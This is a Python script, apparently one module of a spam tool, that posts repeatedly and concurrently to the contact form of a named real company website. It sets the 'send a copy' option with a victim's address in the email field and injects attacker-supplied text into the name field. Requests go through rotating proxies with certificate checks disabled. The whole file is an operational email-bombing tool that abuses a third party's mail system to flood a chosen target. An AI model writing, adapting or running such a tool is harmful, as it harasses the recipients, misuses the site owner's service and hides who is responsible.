from os.path import basename

import requests

from module import Spam

headers = {
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'Origin': 'http://www.accorhis.com',
    'Pragma': 'no-cache',
    'Referer': 'http://www.accorhis.com/en/contact.php',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'X-Prototype-Version': '1.6.0',
    'X-Requested-With': 'XMLHttpRequest',
}
s = 'Your email has been sent !'


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = {
            'c_sendmail': 'ok',
            'nom': self.get_text(),
            'prenom': 'test',
            'societe': 'test',
            'fonction': 'test',
            'adresse': 'test',
            'code_postal': 'test',
            'ville': 'test',
            'telephone': 'test',
            'fax': 'test',
            'email': target,
            'message': 'test',
            'is_copy': 'on',
            '_': '',
        }

        response = requests.post('http://www.accorhis.com/en/send-contact.php', headers=headers, data=data,
                                 verify=False, proxies=self.get_proxies())

        return response


def main():
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post()
    if res:
        spam.run_concurrently()


if __name__ == '__main__':
    main()
